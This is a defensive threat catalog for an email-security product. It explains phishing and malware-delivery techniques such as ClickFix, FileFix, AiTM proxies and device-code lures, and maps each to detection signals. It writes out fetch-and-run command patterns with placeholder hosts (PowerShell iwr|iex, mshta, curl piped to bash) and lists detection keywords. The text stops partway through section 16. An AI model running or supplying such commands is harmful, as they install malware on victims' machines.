# Threat catalog: how fraudsters get people to click, paste, approve or call

What this is: every technique we know of (November 2026) that turns an email
into a stolen password, stolen money or malware, written so an engineer can
see **what to look for** and **which Secureddy signal catches it**.

For each technique: how it works, what the victim sees, what is observable
(a) in the email, (b) on the landing page in the sandbox, (c) in downloads,
and how Secureddy detects it. Signal codes link to the code in
`src/reddysec/analysis/` (copy for the client is in `analysis/signal_copy.py`).

**Sources.** Primary sources first (Microsoft Threat Intelligence, Proofpoint,
Sekoia, Check Point, Fortra, CISA, FBI IC3, MITRE). Links marked † were found
and checked by title and summary in search results only; unmarked links were
read in full while writing this catalog.

**How to read "Detection".** *Never softened* means no sender trust (the
client's "This is safe", a verified newsletter) can lower the signal; see the
protected list in `analysis/trust.py`. *Click advice* is the per-link answer
(`UrlVerdict.click_advice`): `do_not_open`, `open_in_reading_room`,
`safe_to_open`; see `analysis/click_advice.py`.

---

## Contents

1. [ClickFix: fake CAPTCHA / fake error, then Win+R, Ctrl+V, Enter](#1-clickfix)
2. [FileFix: paste into the File Explorer address bar](#2-filefix)
3. [macOS Terminal variants](#3-macos-terminal-variants)
4. [Fake browser update, "font missing", "fix error" pages](#4-fake-update-font-missing-fix-error-pages)
5. [Fake Cloudflare / Turnstile interstitials in front of phishing](#5-fake-cloudflare--turnstile-interstitials)
6. [AiTM reverse-proxy kits (Evilginx, Tycoon 2FA, Mamba 2FA, Rockstar 2FA, EvilProxy, Sneaky 2FA)](#6-aitm-reverse-proxy-kits)
7. [Browser-in-the-Browser (fake sign-in pop-ups)](#7-browser-in-the-browser)
8. [Device-code phishing](#8-device-code-phishing)
9. [OAuth consent phishing and OAuth redirect abuse](#9-oauth-consent-phishing-and-oauth-redirect-abuse)
10. [QR codes ("quishing"): images, PDFs, ASCII QR](#10-qr-codes-quishing)
11. [HTML smuggling and HTML attachments](#11-html-smuggling-and-html-attachments)
12. [SVG phishing attachments](#12-svg-phishing-attachments)
13. [Container and "opens something else" files: password archives, ISO/IMG/VHD, LNK, OneNote, .url, .library-ms, .searchConnector-ms, MSIX/App Installer, JS/HTA/WSF](#13-container-and-opens-something-else-files)
14. [Callback phishing (TOAD)](#14-callback-phishing-toad)
15. [Fake invoice / DocuSign / SharePoint / OneDrive share lures](#15-fake-invoice--docusign--sharepoint--onedrive-share-lures)
16. [Abuse of legitimate hosting and services](#16-abuse-of-legitimate-hosting-and-services)
17. [Open redirects and link wrappers](#17-open-redirects-and-link-wrappers)
18. [Calendar invite phishing](#18-calendar-invite-phishing)
19. [Reply-chain (thread) hijacking](#19-reply-chain-hijacking)
20. [Unicode tricks: RTLO, homoglyphs, zero-width characters](#20-unicode-tricks)
21. [Browser notification spam](#21-browser-notification-spam)
22. [Tech-support scam pages](#22-tech-support-scam-pages)
23. [Crypto wallet drainers](#23-crypto-wallet-drainers)
24. ["Verify your account" + MFA fatigue](#24-verify-your-account--mfa-fatigue)
25. [Voice / deepfake follow-ups (advice only)](#25-voice-and-deepfake-follow-ups)

[Coverage matrix](#coverage-matrix) and [known gaps](#known-gaps) are at the end.

---

## 1. ClickFix

**How it works.** A page shows a fake check ("I'm not a robot", "Verify you
are human") or a fake error. Clicking the box silently copies a command to
the clipboard (`navigator.clipboard.writeText`, or a hidden textarea plus
`document.execCommand('copy')`). The page then shows "Verification steps":
press **Windows + R** (Run box), **Ctrl + V**, **Enter**. Later variants say
**Win + X** then "Terminal" or "PowerShell (Admin)", because multi-line paste
warnings in Terminal put people off. The victim runs the malware by hand, so
there is no download, no attachment and no exploit for a scanner to see.
Payloads: PowerShell (`-w hidden -enc <base64>`, `iwr | iex`, `irm | iex`),
`mshta https://...`, `cmd /c`, `rundll32`, `regsvr32 /i:https://...sct`,
`msiexec /i https://...`, `certutil -urlcache`, `bitsadmin /transfer`,
`conhost --headless`, `finger user@host | cmd`, DNS-based (`nslookup` TXT
record piped to `cmd`). The command often ends with a decoy comment so the Run
box shows only `# I am not a robot - reCAPTCHA Verification ID: 4821`, or is
padded with spaces. MITRE tracks it as T1204.004 (User Execution: Malicious
Copy and Paste). Used by crime groups (Lumma, NetSupport, DarkGate, AsyncRAT)
and by state actors.

**Victim sees.** A reCAPTCHA-like box or a Cloudflare-style "Verify you are
human" page, sometimes a Google "Aw, Snap!" or Word "extension missing"
error, then numbered steps with keyboard icons.

| Where | Observable |
|---|---|
| Email | Link to an unfamiliar or compromised site; HTML attachment named `Report_<digits>.html`, `scan_doc_<digits>.html`; fake GitHub security alert, booking/marketplace/invoice/shipping lures; sometimes plain-text "run this PowerShell to update" with no link at all. |
| Landing page | Text: "I'm not a robot", "Verification steps", "Press Windows + R / ⊞ + R / Win + X", "CTRL + V", "Press Enter", "reCAPTCHA Verification ID", fake "Ray ID". Clipboard write of a command after a click. No request to a real CAPTCHA service (google.com/recaptcha, hcaptcha.com, challenges.cloudflare.com). |
| Downloads | Usually none from the page itself; the pasted command fetches the payload (often from Dropbox, an IP address, or a second domain). |

**Detection.**
- Sandbox (`chamber/detonate.py`): an init script hooks
  `Clipboard.writeText` / `Clipboard.write`, `document.execCommand('copy'|'cut')`
  (records the selected text / textarea value) and `DataTransfer.setData`
  during copy events. The chamber then clicks up to 3 lure elements ("I'm not
  a robot", "Verify", "Fix it", "How to fix", checkbox-like elements with
  `captcha|checkbox|verify|robot|human` in id/class), never inside a form that
  has a password field, never a link that leaves the site. Text of the page
  and its frames is read **after** the clicks. New `PageFeatures` fields:
  `clipboard_writes`, `clickfix_instructions`, `fake_captcha`,
  `run_dialog_lure`, `instruction_hits`, `instruction_excerpt`, `lure_clicks`,
  `captcha_providers`.
- Classifiers (`chamber/lures.py`, dependency-free so they run inside the
  sandbox): command families (PowerShell encoded / hidden / download cradle,
  mshta, cmd, rundll32, regsvr32, msiexec from a URL, certutil, bitsadmin,
  conhost, finger, nslookup, curl/wget piped to a shell, base64 piped to a
  shell, osascript, `xattr -c`, base64 blobs, decoy comments) and instruction
  keys (Win+R, Win+X, Run box, Ctrl+V/paste, Enter, File Explorer + address
  bar / Ctrl+L, Terminal, Cmd+Space, "verification steps", fake verification
  id, fake Ray ID, "how to fix").
- Signals (`analysis/lures.py`):
  - `dynamic.clickfix` **100**, never softened: a dangerous command reached the
    clipboard *and* the page gives Run-box / Win+X / Explorer / Cmd+Space
    steps, or shows a fake CAPTCHA, or the command carries a decoy comment; or
    a dangerous command is printed on a fake check / fake error page next to
    paste steps.
  - `dynamic.clipboard_hijack` **90**, never softened: a dangerous command
    reached the clipboard but we could not read instructions (they may be an
    image).
  - `dynamic.fake_captcha` **40**, never softened: CAPTCHA-looking check with
    keyboard steps or a fake verification id, no payload captured.
  - `attachment.html_clickfix` **90** (70 when no command is visible in the
    source): an HTML attachment with clipboard code and Win+R-style steps.
    The HTML attachment is also detonated as a FILE job (network blocked),
    where the same sandbox signals apply.
- Click advice: `do_not_open`.
- False-positive guards (unit + integration tests): a real reCAPTCHA sign-up
  form, Cloudflare's own "Verify you are human" interstitial, install docs that
  say "Open PowerShell and paste this" with a Copy button (we never click
  "Copy"), and a help article "press Windows + R, type winver" produce none of
  these signals.
- The **Reading Room** never forwards the remote page's clipboard to the
  client (`chamber/readingroom.py`: browser context permissions are empty;
  only pixels are streamed), so a ClickFix page opened there cannot reach the
  client's clipboard.

**Sources.**
[Microsoft: Think before you Click(Fix), Aug 2025](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/) ·
[Proofpoint: ClickFix floods the threat landscape](https://www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape) ·
[Proofpoint: state-sponsored actors try ClickFix †](https://www.proofpoint.com/us/blog/threat-insight/around-world-90-days-state-sponsored-actors-try-clickfix) ·
[Proofpoint: Clipboard to compromise †](https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn) ·
[MITRE ATT&CK T1204.004 †](https://attack.mitre.org/techniques/T1204/004/) ·
[SC World: Microsoft warns of DNS-based ClickFix variant †](https://www.scworld.com/brief/microsoft-warns-of-dns-based-clickfix-variant)

## 2. FileFix

**How it works.** A ClickFix variant (published by mrd0x, mid-2025, then seen
in the wild). The page says a file was shared and asks the victim to open
**File Explorer**, click the **address bar** (or Ctrl+L), paste and press Enter.
The clipboard holds `powershell -c "iwr ... | iex"` followed by many spaces and
`# C:\company\internal-secure\filedrive\HRPolicy.docx`, so the address bar
shows only a believable path. Pasting a command into Explorer's address bar
runs it. Often a button "Open File Explorer" triggers a file-upload dialog to
put Explorer on screen.

**Victim sees.** "HRPolicy.docx was shared with you. To access it: 1. Copy the
path 2. Open File Explorer 3. Paste into the address bar."

| Where | Observable |
|---|---|
| Email | File-share notification lure. |
| Landing page | "File Explorer", "address bar", "Ctrl + L", "Ctrl + V"; a `copy` event handler that `setData`s a command; padded command with a Windows path comment; `<input type=file>` used to open Explorer. |
| Downloads | None from the page. |

**Detection.** Same machinery as ClickFix: the lure clicker clicks "Open File
Explorer", the `copy`-event `setData` hook captures the padded command,
`file_explorer` + `address_bar`/`ctrl_l` + paste counts as Run-box steps.
`dynamic.clickfix` 100 (detail says "the File Explorer address bar").
Click advice `do_not_open`.

**Sources.**
[BleepingComputer: FileFix weaponizes File Explorer †](https://www.bleepingcomputer.com/news/security/filefix-attack-weaponizes-windows-file-explorer-for-stealthy-powershell-commands/) ·
[Intel 471: FileFix threat hunting case study †](https://intel471.com/blog/threat-hunting-case-study-filefix)

## 3. macOS Terminal variants

**How it works.** Same lure, Mac recipe: **Command + Space**, type
**Terminal**, Return, **Command + V**, Return. Payloads: `curl -o /tmp/update
https://... && chmod +x /tmp/update && /tmp/update`, `/bin/bash -c "$(curl
-fsSL https://...)"`, `echo <base64> | base64 -d | bash`, AppleScript via
`osascript` that shows a fake "System Password:" prompt, `xattr -c` to strip
the quarantine flag. Delivers AMOS, Odyssey, Poseidon and similar stealers
(Keychain, browser passwords, crypto wallets). Some kits mount a DMG silently.
Microsoft notes kits sometimes show Windows steps even to Mac users.

**Victim sees.** A Cloudflare-style check with "Mac users: complete these
verification steps".

| Where | Observable |
|---|---|
| Email | Same lures as ClickFix; also fake software / meeting-app downloads. |
| Landing page | "Command + Space", "Terminal", "Command + V"; clipboard write with `curl`/`bash`/`osascript`. |
| Downloads | Sometimes a `.dmg`. |

**Detection.** `curl_pipe_shell`, `curl_download_exec`, `shell_base64`,
`osascript`, `xattr_quarantine` families; `cmd_space` and `terminal_mac`
instruction keys. `dynamic.clickfix` 100 (detail: "the Terminal"). `.dmg`
downloads are installers (`do_not_open`).

**Sources.**
[Netskope: macOS ClickFix campaign †](https://www.netskope.com/blog/macos-clickfix-campaign-applescript-stealers-new-terminal-protections) ·
[Forcepoint X-Labs: Odyssey stealer †](https://www.forcepoint.com/blog/x-labs/odyssey-stealer-attacks-macos-users) ·
[Microsoft ClickFix analysis (AMOS section)](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/)

## 4. Fake update, font missing, fix error pages

**How it works.** A compromised site (ClearFake, SocGholish and successors) or
a lure page shows "Your browser needs an update", "The 'HTML' font was not
found", "Word Online extension is not installed", "Aw, Snap!". Older versions
offer a download (`ChromeUpdate.msi`, `.zip` with `.js`); current versions use
the ClickFix "How to fix" copy-and-paste recipe, including "update the root
certificate" steps.

| Where | Observable |
|---|---|
| Email | Links to a compromised legitimate site, often with a document or invoice pretext. |
| Landing page | "How to fix", "Fix it", "Solution", "font not found", "update required", "root certificate"; injected script on an otherwise normal site. |
| Downloads | `.msi`, `.zip` holding `.js`/`.hta`, `.msix`, `.exe` named like browser updates. |

**Detection.** The lure clicker clicks "How to fix" / "Fix it" / "Solution";
`fix_error` instruction key provides the lure context for
`dynamic.clickfix`. Downloads are classified by `click_advice.describe_download`
(installer / script / program / archive with a program inside) and raise
`dynamic.dangerous_download` 65 (never softened) with `do_not_open` and the
file named in the reason.

**Sources.**
[Microsoft ClickFix analysis (fake error dialogs)](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/) ·
[Proofpoint: ClickFix floods the threat landscape](https://www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape)

## 5. Fake Cloudflare / Turnstile interstitials

**How it works.** Phishing kits put a real or fake "Verify you are human"
challenge in front of the fake sign-in page so automated scanners see only a
CAPTCHA. Tycoon 2FA loads `challenges.cloudflare.com/turnstile/v0/api.js`, says
"this page is running browser checks to ensure your security" and shows the
login only after a pass and a server-side bot check. Fortra saw Workers sites
host fake human-verification pages that lead to Microsoft 365 sign-in.

| Where | Observable |
|---|---|
| Email | Link to an unfamiliar domain or a free host (workers.dev, pages.dev). |
| Landing page | CAPTCHA widget classes (`cf-turnstile`, `h-captcha`) or provider scripts; title "Just a moment..."; a password / email form appears after the gate. |
| Downloads | None. |

**Detection.**
- `dynamic.captcha_gated_login` **30** (bulk-capped): Turnstile / hCaptcha (or
  a CAPTCHA that is not reCAPTCHA) plus a sign-in form on an unpopular host.
  Plain reCAPTCHA on a login form does not count (too common on real sites).
- `dynamic.hidden_from_automation` 20 (existing) when the gate never opened.
- Click advice: `open_in_reading_room` when the gate hid the page; the
  credential signals below decide `do_not_open` when the form is seen.

**Sources.**
[Sekoia: Tycoon 2FA in-depth analysis](https://www.sekoia.com/blog/tycoon-2fa-an-in-depth-analysis-of-the-latest-version-of-the-aitm-phishing-kit) ·
[Fortra: Cloudflare pages.dev / workers.dev abuse](https://www.fortra.com/blog/cloudflares-pagesdev-and-workersdev-domains-increasingly-abused-phishing)

## 6. AiTM reverse-proxy kits

**How it works.** The kit sits between the victim and the real sign-in
service (Microsoft 365, Google, Okta), relays everything in real time and
keeps the session cookie, so the victim's MFA code is used by the attacker.
Evilginx (open source), EvilProxy, Tycoon 2FA, Mamba 2FA, Rockstar 2FA, Sneaky
2FA are sold as phishing-as-a-service. Tells: the real Microsoft sign-in
screen (fonts, logos, `ConvergedLogin` scripts, `/shared/1.0/content/` paths,
`aadcdn.msftauth.net` assets) on a non-Microsoft domain; a Turnstile gate;
random path segments with the victim's email (plain or base64) in the URL;
WebSocket channels (`socket.io` with routes like `enteremail`,
`enterpassword`); obfuscated JavaScript with anti-debugging (`debugger`
loops, DevTools size checks, F12 blocking); bot filtering by IP / user agent.
After compromise: inbox rules and BEC from the victim's mailbox.

| Where | Observable |
|---|---|
| Email | SharePoint / OneDrive / DocuSign / voicemail / payroll lures; links via open redirects or free hosts; victim email in the URL. |
| Landing page | Microsoft sign-in assets or asset paths requested by a page on another host; password + email form; CAPTCHA gate; anti-debug script; bot checks that change location. |
| Downloads | None. |

**Detection.**
- `dynamic.aitm_proxy` **70**, never softened: a sign-in form plus requests to
  Microsoft (or Okta) sign-in asset hosts, or proxied asset paths
  (`/shared/1.0/content/`, `ConvergedLogin`, `/ests/2.1/content/`), from a host
  the brand does not own.
- `dynamic.credential_phish` 75 / `dynamic.password_unknown_host` 45
  (existing, never softened).
- `dynamic.anti_analysis` **25** (bulk-capped): `debugger` timers, DevTools
  size checks, F12 blocking, `console.clear` spam (counted by the init script).
- `dynamic.ua_cloaking` **20** (bulk-capped): script checks
  `navigator.webdriver` / HeadlessChrome / plugins and changes location.
- `dynamic.captcha_gated_login` 30 (section 5).
- Click advice `do_not_open`.

**Sources.**
[Microsoft: AiTM phishing sites as entry point to BEC (2022) †](https://www.microsoft.com/en-us/security/blog/2022/07/12/from-cookie-theft-to-bec-attackers-use-aitm-phishing-sites-as-entry-point-to-further-financial-fraud/) ·
[Microsoft: multi-stage AiTM + BEC abusing SharePoint (2026) †](https://www.microsoft.com/en-us/security/blog/2026/01/21/multistage-aitm-phishing-bec-campaign-abusing-sharepoint/) ·
[Sekoia: Tycoon 2FA](https://www.sekoia.com/blog/tycoon-2fa-an-in-depth-analysis-of-the-latest-version-of-the-aitm-phishing-kit) ·
[Sekoia: Mamba 2FA †](https://blog.sekoia.io/mamba-2fa-a-new-contender-in-the-aitm-phishing-ecosystem/) ·
[Sekoia: Sneaky 2FA †](https://blog.sekoia.io/sneaky-2fa-exposing-a-new-aitm-phishing-as-a-service/) ·
[Sekoia: global analysis of AiTM threats †](https://blog.sekoia.io/global-analysis-of-adversary-in-the-middle-phishing-threats/) ·
[Trustwave/LevelBlue SpiderLabs: Rockstar 2FA †](https://www.levelblue.com/blogs/spiderlabs-blog/rockstar-2fa-a-driving-force-in-phishing-as-a-service-paas) ·
[Resecurity: EvilProxy †](https://www.resecurity.com/advisories/vulnerability/evilproxy-phishing-as-a-service-with-mfa-bypass-emerged-in-dark-web) ·
[Microsoft Security Intelligence: HackTool:Linux/Evilginx †](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool%3ALinux%2FEvilginx%21MTB&ThreatID=2147906620)

## 7. Browser-in-the-Browser

**How it works.** The page draws a fake pop-up window inside itself (HTML/CSS
title bar, padlock and a fake `accounts.google.com` address bar) for "Sign in
with Google / Microsoft". The address shown is just text, so the real host
is the phishing site.

| Where | Observable |
|---|---|
| Email | Usually links to gaming, crypto, or "view document" sites. |
| Landing page | A password form in an iframe or div styled as a window; brand words; page host not the brand. |
| Downloads | None. |

**Detection.** Partial. The fake window still contains a real password form on
the phishing host, so `dynamic.credential_phish` / `dynamic.password_unknown_host`
fire (forms in child frames are inspected too). There is no specific
"drawn address bar" detector yet (see gaps). Click advice `do_not_open`.

**Sources.**
[The Hacker News: Browser-in-the-Browser (mrd0x research) †](https://thehackernews.com/2022/03/new-browser-in-browser-bitb-attack.html)

## 8. Device-code phishing

**How it works.** The attacker starts a real OAuth device-code sign-in, gets a
short code, and sends it to the victim as a "meeting ID" or "verification
code" with the real address `microsoft.com/devicelogin` (or
`login.microsoftonline.com/common/oauth2/deviceauth`, `google.com/device`,
`github.com/login/device`). When the victim types the code and signs in, the
attacker receives tokens for the victim's account, with MFA satisfied. Storm-2372
(later assessed as part of Midnight Blizzard) built rapport over WhatsApp,
Signal or Teams first; 2026 campaigns used AI-written lures.

**Victim sees.** A Teams / meeting invitation: "go to microsoft.com/devicelogin
and enter the code GHK7-PQ2X". The sign-in page is the real Microsoft page.

| Where | Observable |
|---|---|
| Email | A device-login address plus a short code (8-9 alphanumeric, or groups like `XXXX-XXXX`) and "code / meeting id / enter". |
| Landing page | The same text on an attacker page (when the code is on a page). |
| Downloads | None. |

**Detection.**
- `bec.device_code_lure` **70** (email text), never softened. Every link in such
  an email gets `do_not_open` ("the email asks you to type a code...").
- `dynamic.device_code_lure` **70** (page text), never softened.
- Advice to the client: never type a code you did not request.

**Sources.**
[Microsoft: Storm-2372 device code phishing](https://www.microsoft.com/en-us/security/blog/2025/02/13/storm-2372-conducts-device-code-phishing-campaign/) ·
[Microsoft: AI-enabled device code phishing campaign, Apr 2026 †](https://www.microsoft.com/en-us/security/blog/2026/04/06/ai-enabled-device-code-phishing-campaign-april-2026/)

## 9. OAuth consent phishing and OAuth redirect abuse

**How it works.** *Consent phishing*: the link goes straight to the real
Microsoft / Google consent screen for an attacker's app asking for
`Mail.ReadWrite`, `Mail.Send`, `Files.ReadWrite.All`, `offline_access`,
`gmail.modify`, full `drive`. One click on "Accept" gives the app lasting
access that survives a password change. *Redirect abuse* (Microsoft, 2026):
an authorize URL on `login.microsoftonline.com` with a `redirect_uri` on an
attacker domain, so a trusted-looking link bounces to phishing or malware.

| Where | Observable |
|---|---|
| Email | Link to `/oauth2/(v2.0/)authorize`, `accounts.google.com/o/oauth2/auth`, `github.com/login/oauth/authorize` with `client_id`, broad `scope`, or `redirect_uri` on an unknown domain. |
| Landing page | The real consent screen (nothing malicious to see on the page itself). |
| Downloads | Sometimes, after the redirect. |

**Detection.** `url.oauth_consent_lure` **50**, never softened: an authorize
URL with `client_id` and a mailbox/files scope, or with a `redirect_uri` on an
unpopular domain. Ordinary "Sign in with Google" (`openid email profile`) does
not count. Click advice `do_not_open`.

**Sources.**
[Microsoft Entra blog: OAuth consent phishing explained †](https://techcommunity.microsoft.com/blog/microsoft-entra-blog/oauth-consent-phishing-explained-and-prevented/4423357) ·
[Microsoft: OAuth redirection abuse, Mar 2026 †](https://www.microsoft.com/en-us/security/blog/2026/03/02/oauth-redirection-abuse-enables-phishing-malware-delivery/) ·
[Microsoft: app consent grant investigation playbook †](https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-app-consent)

## 10. QR codes (quishing)

**How it works.** The link is a QR code (in an image, inside a PDF, or drawn
with text characters / table cells: "ASCII QR"), so URL scanners never see
it and the victim opens it on an unprotected phone. Typical lures: MFA
re-enrolment, payroll, shared documents, parking fines.

| Where | Observable |
|---|---|
| Email | Image or PDF attachment with a QR; "scan with your phone"; HTML tables of black/white cells or block characters forming a QR. |
| Landing page | A page that itself shows a QR (second hop). |
| Downloads | PDFs with QR codes. |

**Detection.** Existing: QR codes are decoded from images, PDF pages
(`analysis/urls.py`) and sandbox screenshots (`dynamic.qr_on_page`); the
decoded URLs are scored and detonated like any link. ASCII / table-drawn QR
codes are not yet rendered and decoded (gap).

**Sources.**
[Infosecurity: new generation of malicious QR codes (Barracuda research) †](https://www.infosecurity-magazine.com/news/new-gen-malicious-qr-codes/) ·
[ITPro: QR codes hidden in PDF attachments †](https://www.itpro.com/security/hackers-are-stepping-up-qishing-attacks-by-hiding-malicious-qr-codes-in-pdf-email-attachments)

## 11. HTML smuggling and HTML attachments

**How it works.** An HTML attachment (or page) carries the payload as a base64
blob and assembles it in the browser (`atob`, `Blob`, `createObjectURL`,
`msSaveOrOpenBlob`, `<a download>`), so gateways never see the file. Other HTML
attachments are a local sign-in page (a password form posting to the
attacker) or a base64-hidden redirect to the phishing site.

| Where | Observable |
|---|---|
| Email | `.html` / `.htm` / `.shtml` attachment named like a document or voicemail. |
| Landing page | (The attachment is the page.) |
| Downloads | ISO, ZIP, JS assembled in the browser. |

**Detection.** Existing `attachment.html_smuggling` (35-55),
`attachment.html_credential_form` (40-50). Strengthened:
`attachment.html_redirect` is **50** when the redirect target is decoded or
hidden (`atob`, `fromCharCode`, `data:text/html`), 30 otherwise.
`attachment.html_clickfix` (section 1). HTML attachments are also detonated as
FILE jobs with the network blocked. Every `attachment.*` signal is never softened.

**Sources.**
[Microsoft: HTML smuggling surges †](https://www.microsoft.com/en-us/security/blog/2021/11/11/html-smuggling-surges-highly-evasive-loader-technique-increasingly-used-in-banking-malware-targeted-attacks/)

## 12. SVG phishing attachments

**How it works.** SVG is an image format that is also XML a browser executes:
it can contain `<script>`, event handlers (`onload`), `<foreignObject>` with a
full HTML sign-in form, and `data:` page links. Since early 2025 SVG
attachments ("Fax_Message.svg", "Voicemail.svg") are a top phishing carrier:
the script decodes a URL (often with the victim's email in the fragment) and
redirects to an AiTM page, sometimes behind a CAPTCHA.

| Where | Observable |
|---|---|
| Email | `.svg` attachment presented as a voicemail, fax, invoice or signature request. |
| Landing page | After the redirect: AiTM kit (section 6). |
| Downloads | None. |

**Detection.** `attachment.svg_phish` **70** (never softened): script plus a
redirect or decoder, a `<foreignObject>` with a form / input / iframe, or a
`data:text/html` link. Script without those stays `attachment.svg_script` 55.
SVG attachments are detonated as FILE jobs too.

**Sources.**
[KnowBe4: 245% increase in SVG phishing payloads †](https://blog.knowbe4.com/245-increase-in-svg-files-used-to-obfuscate-phishing-payloads) ·
[Trustwave/LevelBlue SpiderLabs: the surge of SVG-borne phishing †](https://www.levelblue.com/blogs/spiderlabs-blog/pixel-perfect-trap-the-surge-of-svg-borne-phishing-attacks)

## 13. Container and "opens something else" files

**How it works.** After Microsoft blocked internet macros (2022), attackers
moved to files that run something when double-clicked, or that slip past the
"downloaded from the internet" mark:

- **Password-protected ZIP/7z/RAR** with the password in the email: scanners
  cannot look inside.
- **ISO / IMG / VHD / VHDX** disk images: mount on double-click; older Windows
  did not carry the internet mark to files inside.
- **LNK** shortcuts (often `Invoice.pdf.lnk`) running PowerShell / mshta.
- **OneNote (.one)** with a fake "Double-click to view" button over an
  embedded HTA / script (2023 wave).
- **.url / .library-ms / .searchConnector-ms**: open a remote share (WebDAV)
  that hosts an LNK or script, or leak NTLM hashes (CVE-2025-24054 via
  `.library-ms`).
- **MSIX / App Installer (.appinstaller, ms-appinstaller:)**: signed-looking
  installers for fake Teams / Zoom / Adobe (Storm-1113 et al.; Microsoft
  disabled the protocol handler by default).
- **JS / JSE / VBS / WSF / HTA / BAT / PS1** scripts.

| Where | Observable |
|---|---|
| Email | Such attachments, or links that download them; "password: 2026" in the body. |
| Landing page | Download starts on load or on a button. |
| Downloads | Sniffed type (ISO 9660 descriptor at 0x8001, LNK header, OneNote GUID, OLE/MSI, VHDX header, App Installer XML, `[InternetShortcut]`, `libraryDescription`), ZIP entry names, encrypted flag. |

**Detection.**
- Attachments (existing, extended): `attachment.dangerous_type` now includes
  `.appinstaller` 70, `.searchConnector-ms` 70, `.msix`/`.appx` 65,
  `.msixbundle`/`.appxbundle` 65, `.application` 65, `.iqy` 60, `.slk` 55,
  `.website` 60 and more; `attachment.archive_password_in_body` 55,
  `attachment.archive_encrypted` 35, `attachment.disk_image` 70,
  `attachment.archive_dangerous_entry`.
- Downloads from links (new): the chamber reads up to 36 KB of each download
  and refines the type (`chamber/common.refine_download_type`: iso9660, vhd,
  vhdx, lnk, one, msi, appinstaller, library-ms, searchconnector-ms,
  url-shortcut, hta, wsf, svg), lists ZIP entries and the encrypted flag
  (`DownloadRecord.archive_entries`, `.encrypted`).
  `click_advice.describe_download` turns that into a category (program, script,
  installer, disk_image, shortcut, password_archive, onenote, macro_document,
  archive, document, other), `dangerous`, and a plain reason; this feeds
  `dynamic.dangerous_download` 65 (never softened) and
  `UrlVerdict.downloads_summary`. A dangerous download means `do_not_open` with
  the file named; a harmless one (a PDF) means `open_in_reading_room`.

**Sources.**
[Proofpoint: how threat actors adapt to a post-macro world †](https://www.proofpoint.com/us/blog/threat-insight/how-threat-actors-are-adapting-post-macro-world) ·
[Proofpoint: OneNote documents used to deliver malware †](https://www.proofpoint.com/us/blog/threat-insight/onenote-documents-increasingly-used-to-deliver-malware) ·
[Microsoft: threat actors misusing App Installer †](https://www.microsoft.com/en-us/security/blog/2023/12/28/financially-motivated-threat-actors-misusing-app-installer/) ·
[Check Point Research: CVE-2025-24054 NTLM exploit in the wild (.library-ms) †](https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/)

## 14. Callback phishing (TOAD)

**How it works.** Telephone-oriented attack delivery: an email (or PDF) says
you were charged for a renewal (Geek Squad, Norton, McAfee, PayPal, an
antivirus "annual plan") and gives a phone number "to cancel". There is no
link, so link scanners pass it. On the call, the "agent" takes card details
or has the victim install remote-access software.

| Where | Observable |
|---|---|
| Email | Phone number + renewal/charge words + cancel/refund/"did not authorize" + call words; zero or one link; often a freemail sender or a PDF invoice. |
| Landing page | None. |
| Downloads | Remote-access tools later, over the phone. |

**Detection.** `bec.callback_scam` **45** (**55** from a freemail sender). It
is in the verified-newsletter soft list: real stores send renewal receipts with
phone numbers, so a Google-verified mailing-list sender that is not a
lookalike does not get it; lookalike senders always do.

**Sources.**
[Proofpoint: the 411 on telephone-oriented attack delivery †](https://www.proofpoint.com/us/blog/threat-insight/caught-beneath-landline-411-telephone-oriented-attack-delivery) ·
[Proofpoint: typical attack sequence of TOAD threats †](https://www.proofpoint.com/us/blog/email-and-cloud-threats/cybersecurity-stop-month-attack-sequence-toad-threats)

## 15. Fake invoice / DocuSign / SharePoint / OneDrive share lures

**How it works.** The most common wrapper for everything above: "You have a
document to sign", "X shared 'Q4 Payment.pdf' with you", "Invoice overdue".
Some are sent from real compromised SharePoint / OneDrive tenants, so the
first link really is on `sharepoint.com` and the payload is one click deeper.

| Where | Observable |
|---|---|
| Email | Brand names in the display name or body; mismatched link text; a sender domain that imitates the brand; a real file-share link from an unknown tenant. |
| Landing page | A brand sign-in page on another host; a file-share page with a second "View document" link. |
| Downloads | ZIP / ISO / HTML. |

**Detection.** Existing brand impersonation (`sender.display_brand_impersonation`,
`sender.domain_lookalike`, `url.lookalike`, `url.display_mismatch`),
`dynamic.credential_phish` and `bec.invoice_first_time`, plus everything in
sections 1, 6, 11-13 for what the link leads to.

**Sources.**
[Proofpoint: Microsoft misses and hosts weaponized file-sharing attacks †](https://www.proofpoint.com/us/blog/email-and-cloud-threats/microsoft-misses-and-hosts-weaponized-file-sharing-attacks) ·
[Microsoft: multi-stage AiTM + BEC abusing SharePoint †](https://www.microsoft.com/en-us/security/blog/2026/01/21/multistage-aitm-phishing-bec-campaign-abusing-sharepoint/)

## 16. Abuse of legitimate hosting and services

**How it works.** Phishing pages are hosted where they inherit a good name and
free HTTPS: Cloudflare Workers / Pages / R2 (`workers.dev`, `pages.dev`,
`r2.dev`; Fortra measured +104% and +198% phishing in 2024), Firebase /
Google (`web.app`, `firebaseapp.com`, `storage.googleapis.com`,
`script.google.com`, `sites.google.com`, Google Forms / Drawings), Azure
storage (`blob.core.windows.net`), IPFS gateways (`ipfs.io`, `dweb.link`,
`*.ipfs.*`), developer hosting and tunnels (`github.io`, `vercel.app`,
`netlify.app`, `onrender.com`, `glitch.me`, `replit.dev`, `ngrok-free.app`),
site builders (`canva.site`, `notion.site`, `webflow.io`, `wixsite.com`,
`weebly`, `000webhostapp.com`), Google Translate proxies (`translate.goog`),
Dropbox direct links.

| Where | Observable |
|---|---|
| Email | Links to these hosts, often behind an open redirect. |
| Landing page | A brand sign-in page or "view document" button on the free host. |
| Downloads | Files served from Dropbox / storage buckets. |

**Detection.** Bundled list `analysis/data/abused_hosts.txt` (host suffixes and
host + path prefixes such as `docs.google.com/forms`):
- `url.free_hosting` **12** on its own (verified-newsletter soft list);
